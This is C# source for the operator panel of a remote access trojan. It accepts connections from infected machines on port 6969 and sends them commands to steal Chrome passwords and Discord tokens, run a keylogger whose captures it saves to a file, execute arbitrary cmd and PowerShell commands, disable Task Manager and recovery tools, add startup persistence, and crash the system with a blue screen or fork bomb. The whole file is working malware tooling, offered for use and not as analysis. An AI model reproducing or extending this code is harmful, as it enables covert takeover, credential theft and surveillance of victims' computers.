using Server;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Rat_Server
{
    public partial class Form1 : Form
    {
        private TcpListener listener;
        private readonly object clientLock = new object();
        private readonly List<TcpClient> connectedClients = new List<TcpClient>();
        private int clientCounter = 0;
        private readonly Dictionary<string, TcpClient> clientDictionary = new Dictionary<string, TcpClient>();
        private static NetworkStream stream;

        public Form1()
        {
            InitializeComponent();
            InitializeListView();
            StartServer();
        }

        private void WriteKeylogToFile(string keylogData)
        {
            try
            {
                // Get the path to the Desktop folder
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string filePath = Path.Combine(desktopPath, "keylogs.txt");

                // Append keylog data to the file
                using (StreamWriter sw = new StreamWriter(filePath, true))
                {
                    sw.WriteLine($"{DateTime.Now}: {keylogData}");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error writing keylog to file: {ex.Message}");
            }
        }

        private void AddClientToListView(int clientId, string publicIp, string windowsVersion, string username)
        {
            ListViewItem item = new ListViewItem("Client " + clientId); // Client ID
            item.SubItems.Add(publicIp); // Public IP
            item.SubItems.Add(windowsVersion); // Windows Version
            item.SubItems.Add(username); // Username

            listView1.Items.Add(item);
        }

        private string GetPublicIp()
        {
            try
            {
                using (var client = new System.Net.WebClient())
                {
                    return client.DownloadString("https://ipinfo.io/ip").Trim();
                }
            }
            catch
            {
                return "Unknown";
            }
        }

        private string GetFriendlyWindowsVersion()
        {
            string result = "Unknown Windows Version";

            try
            {
                // Create a ManagementObjectSearcher to query the operating system information
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");

                foreach (ManagementObject os in searcher.Get())
                {
                    // Get the name of the operating system
                    result = os["Caption"].ToString();
                }
            }
            catch (Exception ex)
            {
                result = "Error retrieving version: " + ex.Message;
            }

            return result;
        }


        private string GetWindowsVersion()
        {
            return GetFriendlyWindowsVersion();
        }

        private string GetUsername()
        {
            return Environment.UserName;
        }

        private void InitializeListView()
        {
            listView1.View = View.Details;
            listView1.Columns.Add("Client ID", 100);
            listView1.Columns.Add("Public IP", 150);
            listView1.Columns.Add("Windows Version", 200);
            listView1.Columns.Add("Username", 100);
        }

        private void StartServer()
        {
            Task.Run(async () =>
            {
                listener = new TcpListener(IPAddress.Any, 6969);
                listener.Start();
                MessageBox.Show("Server started on port 6969...");

                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    lock (clientLock)
                    {
                        clientCounter++;
                        string clientId = $"Client {clientCounter}";
                        clientDictionary[clientId] = client;
                        AddClientToComboBox(clientId);
                    }

                    // Add client information to ListView
                    string publicIp = GetPublicIp();
                    string windowsVersion = GetWindowsVersion();
                    string username = GetUsername();
                    AddClientToListView(clientCounter, publicIp, windowsVersion, username);

                    MessageBox.Show($"Client connected: {client.Client.RemoteEndPoint}");
                    _ = HandleClientAsync(client);
                }
            });
        }

        private static void Send(string message)
        {
            byte[] data = Encoding.ASCII.GetBytes(message + "|");
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }
        private async Task HandleClientAsync(TcpClient client)
        {
            NetworkStream stream = client.GetStream();

            try
            {
                while (client.Connected)
                {
                    byte[] buffer = new byte[1024];
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);

                    if (bytesRead > 0)
                    {
                        string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                        // If the message is a keylog, write it to the file
                        if (message.StartsWith("keylog"))
                        {
                            // Log keypress data to file
                            WriteKeylogToFile(message);
                        }
                        else
                        {
                            MessageBox.Show($"Received: {message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error with client {client.Client.RemoteEndPoint}: {ex.Message}");
            }
            finally
            {
                // Client disconnection handling remains unchanged
                string disconnectedClientId = null;

                lock (clientLock)
                {
                    foreach (var kvp in clientDictionary)
                    {
                        if (kvp.Value == client)
                        {
                            disconnectedClientId = kvp.Key;
                            break;
                        }
                    }

                    if (disconnectedClientId != null)
                    {
                        clientDictionary.Remove(disconnectedClientId);
                        RemoveClientFromComboBox(disconnectedClientId);
                        // Remove the client from the ListView
                        Invoke(new Action(() =>
                        {
                            foreach (ListViewItem item in listView1.Items)
                            {
                                if (item.Text == disconnectedClientId)
                                {
                                    listView1.Items.Remove(item);
                                    break;
                                }
                            }
                        }));
                    }
                }

                client.Close();
                MessageBox.Show($"Client disconnected: {client.Client.RemoteEndPoint}");
            }
        }



        private void SendCommand(TcpClient client, string command)
        {
            NetworkStream stream = client.GetStream();
            byte[] data = Encoding.ASCII.GetBytes(command + "|");
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }

        private void chromePasswords_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("chrome_info");
        }

        private void PowershellCommand_Click(object sender, EventArgs e)
        {
            OpenCommandInputDialog("pscommand");
        }

        private void CmdCommand_Click(object sender, EventArgs e)
        {
            OpenCommandInputDialog("cmdcommand");
        }

        private void OpenCommandInputDialog(string commandType)
        {
            using (var inputForm = new Form())
            {
                inputForm.Text = $"Enter {commandType} Command";
                inputForm.Size = new System.Drawing.Size(300, 150);

                Label lblCommand = new Label() { Left = 10, Top = 20, Text = $"Enter {commandType} Command:" };
                TextBox txtCommand = new TextBox() { Left = 10, Top = 50, Width = 250 };
                Button btnSubmit = new Button() { Left = 190, Top = 80, Text = "Submit" };

                btnSubmit.Click += (sender, e) =>
                {
                    string command = txtCommand.Text;
                    if (!string.IsNullOrEmpty(command))
                    {
                        // Concatenate the command type with the command (e.g., "cmd|dir" or "powershell|Get-Process")
                        string fullCommand = $"{commandType}|{command}";

                        // Send the concatenated command to the selected client
                        SendCommandToSelectedClient(fullCommand);
                        MessageBox.Show($"Command sent: {fullCommand}");
                    }
                    else
                    {
                        MessageBox.Show("Command cannot be empty.");
                    }
                    inputForm.Close();
                };

                inputForm.Controls.Add(lblCommand);
                inputForm.Controls.Add(txtCommand);
                inputForm.Controls.Add(btnSubmit);
                inputForm.ShowDialog();
            }
        }

        private void ReagentcEnable_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("enable_reagentc");
        }

        private void ReagentcDisable_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("disable_reagentc");
        }

        private void EnableCmd_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("enable_cmd");
        }

        private void DisableCmd_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("disable_cmd");
        }

        private void EnableTaskManager_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("enable_taskmanager");
        }

        private void DisableTaskManager_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("disable_taskmanager");
        }

        private void AddToStartup_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("add_to_startup");
        }

        private void SetVolumeTo100_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("set_volume_100");
        }

        private void bsod_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("bsod");
        }

        private void RemoveFromStartup_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("remove_from_startup");
        }

        private void GetDiscordTokens_Click(object sender, EventArgs e)
        {

            SendCommandToSelectedClient("get_discord_tokens");
        }

        private void jeff_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("jtk");
        }

        private void uac_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("uac");
        }

        private void SendCommandToSelectedClient(string command)
        {
            TcpClient client = GetSelectedClient();
            if (client != null)
            {
                SendCommand(client, command);
                MessageBox.Show($"Command sent to {client.Client.RemoteEndPoint}: {command}");
            }
        }

        private TcpClient GetSelectedClient()
        {
            string selectedClient = comboBoxClients.SelectedItem?.ToString();
            if (string.IsNullOrEmpty(selectedClient))
            {
                MessageBox.Show("Please select a client first!");
                return null;
            }

            lock (clientLock)
            {
                if (clientDictionary.TryGetValue(selectedClient, out var client))
                {
                    return client;
                }
                else
                {
                    MessageBox.Show("Selected client is no longer connected.");
                    return null;
                }
            }
        }

        private void AddClientToComboBox(string clientId)
        {
            Invoke(new Action(() =>
            {
                comboBoxClients.Items.Add(clientId);
            }));
        }

        private void RemoveClientFromComboBox(string clientId)
        {
            Invoke(new Action(() =>
            {
                comboBoxClients.Items.Remove(clientId);
            }));
        }

        private void forkBomb_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("forkbomb");
        }

        private void keylogger_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("keylogger");
        }

        private void stopKeylogger_Click(Object sender, EventArgs e)
        {
            SendCommandToSelectedClient("stopkeylogger");
        }

        private void kill_Click(object sender, EventArgs e)
        {
            TcpClient client = GetSelectedClient();

            if (client != null)
            {
                try
                {
                    // Send a command to the client to terminate itself
                    SendCommandToSelectedClient("kill_client");
                    MessageBox.Show($"Sent termination command to client: {client.Client.RemoteEndPoint}");

                    // Send a command to the client to remove itself from startup
                    SendCommandToSelectedClient("remove_from_startup");
                    MessageBox.Show($"Sent remove from startup command to client: {client.Client.RemoteEndPoint}");

                    // Remove the client from the ListView
                    string selectedClientId = comboBoxClients.SelectedItem?.ToString();
                    if (!string.IsNullOrEmpty(selectedClientId))
                    {
                        Invoke(new Action(() =>
                        {
                            foreach (ListViewItem item in listView1.Items)
                            {
                                if (item.Text == selectedClientId)
                                {
                                    listView1.Items.Remove(item);
                                    break;
                                }
                            }
                        }));

                        // Remove from the ComboBox
                        RemoveClientFromComboBox(selectedClientId);
                    }

                    // Disconnect the client
                    client.Close();
                    MessageBox.Show($"Client disconnected: {client.Client.RemoteEndPoint}");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error killing client: {ex.Message}");
                }
            }
            else
            {
                MessageBox.Show("No client selected.");
            }
        }

        private void uacNotify_Click(object sender, EventArgs e)
        {
            SendCommandToSelectedClient("uacnotify");
        }
    }
}